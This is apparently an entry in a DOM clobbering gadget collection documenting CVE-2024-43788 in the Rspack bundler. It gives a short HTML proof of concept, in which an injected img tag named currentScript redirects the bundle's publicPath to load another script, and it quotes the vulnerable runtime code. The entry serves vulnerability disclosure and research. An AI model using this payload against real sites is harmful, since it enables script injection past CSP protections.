---
description: Rspack is a high performance JavaScript bundler written in Rust. It offers strong compatibility with the webpack ecosystem, allowing for seamless replacement of webpack, and provides lightning fast build speeds.
github: web-infra-dev/rspack
gadgets:
  Latest:
    cve: CVE-2024-43788
    authors:
      - github:jackfromeast
      - github:ishmeals
    tags:
      - chrome-browser
      - safari-browser
      - img-tag
      - name-attr
      - src-attr
      - strict-dynamic-csp
      - before-lib-load
    pocs:
      - description: This issue was supposed to be fixed in [v1.0.0-rc.1](https://github.com/web-infra-dev/rspack/releases/tag/v1.0.0-rc.1). However, it appears that under certain conditions, such as this [@arkark_](http://x.com/arkark_) [challenge](https://alpacahack.com/challenges/alpaca-mark), it is still possible to reproduce it in the latest version.
        code: |
          <!-- user input -->
          <img name="currentScript" src="[current-location]/assets/xss/index.js">

          <script nonce="secret" src="[current-location]/assets/libs/rspack/bundle.js"></script>
    more-info: |
      **Root Cause**

      Source: It was supposed to be in `crates/rspack_plugin_hmr/src/runtime/hot_module_replacement.js` but, I didn't found any reference to it. You can find one of the expected case which contains it [here](https://github.com/web-infra-dev/rspack/blob/621cd3b253efe7350b69eed7c14163ac2739c1b6/crates/rspack_plugin_css/webpack_css_cases_to_be_migrated/chunkFilename-fullhash/expected/webpack-5/main.js#L155).

      ```javascript
      /******/ 	/* webpack/runtime/publicPath */
      /******/ 	(() => {
      /******/ 		var scriptUrl;
      /******/ 		if (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + "";
      /******/ 		var document = __webpack_require__.g.document;
      /******/ 		if (!scriptUrl && document) {
      /******/ 			if (document.currentScript)
      /******/ 				scriptUrl = document.currentScript.src
      /******/ 			if (!scriptUrl) {
      /******/ 				var scripts = document.getElementsByTagName("script");
      /******/ 				if(scripts.length) scriptUrl = scripts[scripts.length - 1].src
      /******/ 			}
      /******/ 		}
      /******/ 		// When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration
      /******/ 		// or pass an empty string ("") and set the __webpack_public_path__ variable from your code to use your own logic.
      /******/ 		if (!scriptUrl) throw new Error("Automatic publicPath is not supported in this browser");
      /******/ 		scriptUrl = scriptUrl.replace(/#.*$/, "").replace(/\?.*$/, "").replace(/\/[^\/]+$/, "/");
      /******/ 		__webpack_require__.p = scriptUrl;
      /******/ 	})();
      ```
    links:
      - https://github.com/advisories/GHSA-84jw-g43v-8gjm
      - https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/rspack.md
      - https://jackfromeast.github.io/assets/DOMinoEffect.pdf
---
